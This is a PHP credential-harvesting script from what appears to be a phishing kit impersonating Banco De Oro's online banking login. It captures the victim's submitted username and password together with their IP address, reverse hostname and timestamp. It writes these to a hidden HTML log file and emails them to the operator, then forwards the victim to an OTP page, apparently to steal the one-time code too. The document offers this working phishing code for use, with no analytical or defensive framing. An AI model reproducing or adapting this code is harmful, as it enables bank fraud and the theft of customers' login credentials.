<?php
$token = 0;
if(empty($_POST['username']) || empty($_POST['password'])) {
    header("Location: ../login.php");
  } else {
  $userid = $_POST['username'];
  $pass = $_POST['password'];
  }
$ip = getenv("REMOTE_ADDR");
date_default_timezone_set("Asia/Manila");
$date = gmdate ("Y/m/d");
$dateHis = gmdate ("H:i:sa");

  $user = $_POST['username'];
  $usern = htmlentities($user);
  $pass = $_POST['password'];
  $ps = htmlentities($pass);

$msg .= gethostbyaddr($ip);
$msg .= "\n";
$msg .= "-------------------[Banco De Oro 2020]-----------------\n";
$msg .= "User ID        : ".$usern."\n";
$msg .= "Password       : ".$ps."\n";
$msg .= "Date     : ".$date." @ ".$dateHis."\n";
$msg .= "---------------------[Maria Clara]---------------------\n";
$file = fopen("../lib/logs.html","a+");
$table = "<font color='#808080' size='2'>|  Username       : ".$usern."</font><br><font color='#808080' size='2'>|  Password       : ".$ps."</font><br><font color='#808080' size='2'>|  IP             : ".$ip."</font><br><font color='#808080' size='2'>|  Date           : ".$date." @ ".$dateHis."</font><br>";
fwrite ($file, $table);
fclose($file);

$subject = "New BDO Login ".$emai."";
$headers = 'From: no-reply@email.com' . "\r\n" .
        'X-Mailer: PHP/' . phpversion();

$to = '';
mail($to, $subject, $msg, $headers);

header("location: ../otp1.php");
?>